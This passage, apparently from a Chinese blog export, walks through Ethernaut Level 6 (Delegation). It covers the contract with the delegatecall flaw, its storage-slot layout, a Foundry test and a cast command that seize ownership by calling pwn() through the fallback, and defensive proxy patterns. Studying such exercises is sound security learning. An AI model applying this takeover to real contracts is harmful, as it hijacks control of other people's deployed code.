代理文档](https://docs.openzeppelin.com/contracts/4.x/api/proxy)**\n- **[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在智能合约的世界中，上下文就是一切。* 🔄","slug":"ethernaut-level-06-delegation","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp5000nbf5q1yxb7cbv","content":"<h1 id=\"🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击\"><a href=\"#🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击\"></a>🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/6\">Ethernaut Level 6 - Delegation</a><br><strong>攻击类型</strong>: delegatecall 存储槽攻击<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>核心概念</strong>: 存储上下文切换、代理模式安全</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考验对 <code>delegatecall</code> 机制的深入理解：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为 <code>Delegation</code> 合约的 <code>owner</code></li>\n<li><strong>理解上下文切换</strong> - 掌握 <code>delegatecall</code> 的存储机制</li>\n<li><strong>学习代理模式风险</strong> - 了解升级模式的安全隐患</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegate &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _owner) &#123;</span><br><span class=\"line\">        owner = _owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function pwn() public &#123;</span><br><span class=\"line\">        owner = msg.sender;  // 🎯 目标函数：会修改 owner</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegation &#123;</span><br><span class=\"line\">    address public owner;      // 🚨 存储槽 0</span><br><span class=\"line\">    Delegate delegate;         // 🚨 存储槽 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _delegateAddress) &#123;</span><br><span class=\"line\">        delegate = Delegate(_delegateAddress);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        // 🚨 危险的 delegatecall</span><br><span class=\"line\">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class=\"line\">        if (result) &#123;</span><br><span class=\"line\">            this;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"核心概念：delegatecall-vs-call\"><a href=\"#核心概念：delegatecall-vs-call\" class=\"headerlink\" title=\"核心概念：delegatecall vs call\"></a>核心概念：delegatecall vs call</h3><table>\n<thead>\n<tr>\n<th>调用方式</th>\n<th>执行上下文</th>\n<th>存储修改</th>\n<th>msg.sender</th>\n<th>使用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>call</strong></td>\n<td>被调用合约</td>\n<td>被调用合约</td>\n<td>调用合约地址</td>\n<td>普通外部调用</td>\n</tr>\n<tr>\n<td><strong>delegatecall</strong></td>\n<td>调用合约</td>\n<td>调用合约</td>\n<td>原始调用者</td>\n<td>代理模式、升级</td>\n</tr>\n</tbody></table>\n<h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p><strong>delegatecall 的工作机制</strong>：</p>\n<ul>\n<li>执行<strong>被调用合约的代码</strong></li>\n<li>使用<strong>调用合约的存储</strong></li>\n<li>保持<strong>原始的 msg.sender</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 当 Delegation 合约执行 delegatecall 时：</span><br><span class=\"line\">delegate.delegatecall(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">// 实际执行：</span><br><span class=\"line\">// 1. 运行 Delegate.pwn() 的代码</span><br><span class=\"line\">// 2. 但是在 Delegation 合约的存储上下文中</span><br><span class=\"line\">// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"存储槽布局分析\"><a href=\"#存储槽布局分析\" class=\"headerlink\" title=\"存储槽布局分析\"></a>存储槽布局分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Delegate 合约存储布局</span><br><span class=\"line\">// 槽 0: address owner</span><br><span class=\"line\"></span><br><span class=\"line\">// Delegation 合约存储布局  </span><br><span class=\"line\">// 槽 0: address owner     ← 这个会被 delegatecall 修改！</span><br><span class=\"line\">// 槽 1: Delegate delegate</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>构造函数调用数据</strong> - 编码 <code>pwn()</code> 函数选择器</li>\n<li><strong>触发 fallback 函数</strong> - 向合约发送带数据的交易</li>\n<li><strong>执行 delegatecall</strong> - 在 Delegation 存储上下文中执行 <code>pwn()</code></li>\n<li><strong>获得控制权</strong> - <code>owner</code> 被设置为攻击者地址</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Delegation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DelegationTest is Test &#123;</span><br><span class=\"line\">    Delegate public delegate;</span><br><span class=\"line\">    Delegation public delegation;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public deployer = makeAddr(&quot;deployer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        vm.startPrank(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Delegate 合约</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Delegation 合约</span><br><span class=\"line\">        delegation = new Delegation(address(delegate));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDelegationExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 关键攻击：构造 pwn() 函数调用</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 fallback 函数触发 delegatecall</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(delegation.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attack successful!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderstandDelegatecall() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== Before Attack ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 直接调用 delegate.pwn() 只会修改 delegate 的存储</span><br><span class=\"line\">        delegate.pwn();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After direct call to Delegate.pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 不变</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 变为 attacker</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 重置状态</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        vm.prank(deployer);</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 delegatecall 调用 pwn()</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After delegatecall to pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 变为 attacker!</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 不变</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testFunctionSelector() public view &#123;</span><br><span class=\"line\">        // 演示函数选择器的计算</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.log(&quot;pwn() selector:&quot;);</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bytes memory encoded = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        console.log(&quot;Encoded call data:&quot;);</span><br><span class=\"line\">        console.logBytes(encoded);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"手动攻击脚本\"><a href=\"#手动攻击脚本\" class=\"headerlink\" title=\"手动攻击脚本\"></a>手动攻击脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 如果需要手动攻击，可以使用 cast 命令</span><br><span class=\"line\">contract ManualAttack is Test &#123;</span><br><span class=\"line\">    function testManualAttack() public &#123;</span><br><span class=\"line\">        // 1. 计算函数选择器</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. 使用 cast 发送交易</span><br><span class=\"line\">        // cast send &lt;DELEGATION_ADDRESS&gt; &lt;SELECTOR&gt; --private-key &lt;YOUR_KEY&gt;</span><br><span class=\"line\">        // 例如：cast send 0x... 0xdd365b8b --private-key ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Delegation 攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract DelegationTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># Initial owner: 0x... (deployer)</span></span><br><span class=\"line\"><span class=\"comment\"># Attacker address: 0x... (attacker) </span></span><br><span class=\"line\"><span class=\"comment\"># New owner: 0x... (attacker)</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful!</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-严格的存储布局匹配\"><a href=\"#1-严格的存储布局匹配\" class=\"headerlink\" title=\"1. 严格的存储布局匹配\"></a>1. 严格的存储布局匹配</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeProxy &#123;</span><br><span class=\"line\">    // ✅ 确保代理和实现合约有相同的存储布局</span><br><span class=\"line\">    address public owner;           // 槽 0</span><br><span class=\"line\">    address public implementation; // 槽 1</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function upgrade(address newImplementation) public onlyOwner &#123;</span><br><span class=\"line\">        implementation = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        address impl = implementation;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // 使用内联汇编进行更安全的 delegatecall</span><br><span class=\"line\">            calldatacopy(0, 0, calldatasize())</span><br><span class=\"line\">            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)</span><br><span class=\"line\">            returndatacopy(0, 0, returndatasize())</span><br><span class=\"line\">            </span><br><span class=\"line\">            switch result</span><br><span class=\"line\">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class=\"line\">            default &#123; return(0, returndatasize()) &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-OpenZeppelin-的代理模式\"><a href=\"#2-使用-OpenZeppelin-的代理模式\" class=\"headerlink\" title=\"2. 使用 OpenZeppelin 的代理模式\"></a>2. 使用 OpenZeppelin 的代理模式</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;</span><br><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureUpgradeableContract &#123;</span><br><span class=\"line\">    // 使用 OpenZeppelin 的标准化代理实现</span><br><span class=\"line\">    // 包含完整的安全检查和存储隔离</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-函数选择器白名单\"><a href=\"#3-函数选择器白名单\" class=\"headerlink\" title=\"3. 函数选择器白名单\"></a>3. 函数选择器白名单</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract RestrictedDelegation &#123;</span><br><span class=\"line\">    mapping(bytes4 =&gt; bool) public allowedSelectors;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        // 只允许特定函数被 delegatecall</span><br><span class=\"line\">        allowedSelectors[bytes4(keccak256(&quot;safeFunction()&quot;))] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        bytes4 selector = bytes4(msg.data);</span><br><span class=\"line\">        require(allowedSelectors[selector], &quot;Function not allowed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行 delegatecall</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-存储槽隔离\"><a href=\"#4-存储槽隔离\" class=\"headerlink\" title=\"4. 存储槽隔离\"></a>4. 存储槽隔离</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract IsolatedStorage &#123;</span><br><span class=\"line\">    // 使用 EIP-1967 标准存储槽</span><br><span class=\"line\">    bytes32 private constant IMPLEMENTATION_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    bytes32 private constant ADMIN_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.admin&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _getImplementation() internal view returns (address) &#123;</span><br><span class=\"line\">        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _setImplementation(address newImplementation) internal &#123;</span><br><span class=\"line\">        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-EVM-调用类型对比\"><a href=\"#1-EVM-调用类型对比\" class=\"headerlink\" title=\"1. EVM 调用类型对比\"></a>1. EVM 调用类型对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CallExample &#123;</span><br><span class=\"line\">    function demonstrateCalls(address target) public &#123;</span><br><span class=\"line\">        // 1. call - 普通外部调用</span><br><span class=\"line\">        (bool success1,) = target.call(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. delegatecall - 委托调用</span><br><span class=\"line\">        (bool success2,) = target.delegatecall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 3. staticcall - 只读调用</span><br><span class=\"line\">        (bool success3,) = target.staticcall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;viewFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-存储槽冲突示例\"><a href=\"#2-存储槽冲突示例\" class=\"headerlink\" title=\"2. 存储槽冲突示例\"></a>2. 存储槽冲突示例</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 危险：不匹配的存储布局</span><br><span class=\"line\">contract ProxyV1 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0</span><br><span class=\"line\">    uint256 public value;    // 槽 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV1 &#123;</span><br><span class=\"line\">    uint256 public data;     // 槽 0 ← 冲突！</span><br><span class=\"line\">    address public admin;    // 槽 1 ← 冲突！</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：匹配的存储布局</span><br><span class=\"line\">contract ProxyV2 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0</span><br><span class=\"line\">    uint256 public value;    // 槽 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV2 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0 ← 匹配</span><br><span class=\"line\">    uint256 public value;    // 槽 1 ← 匹配</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-函数选择器计算\"><a href=\"#3-函数选择器计算\" class=\"headerlink\" title=\"3. 函数选择器计算\"></a>3. 函数选择器计算</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateSelector() public pure returns (bytes4) &#123;</span><br><span class=\"line\">    // 方法 1：直接计算</span><br><span class=\"line\">    bytes4 selector1 = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 2：使用 abi.encodeWithSignature</span><br><span class=\"line\">    bytes memory data = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">    bytes4 selector2 = bytes4(data);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 3：使用 this.functionName.selector</span><br><span class=\"line\">    // bytes4 selector3 = this.pwn.selector; // 如果函数存在</span><br><span class=\"line\">    </span><br><span class=\"line\">    return selector1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-实际应用场景\"><a href=\"#🏛️-实际应用场景\" class=\"headerlink\" 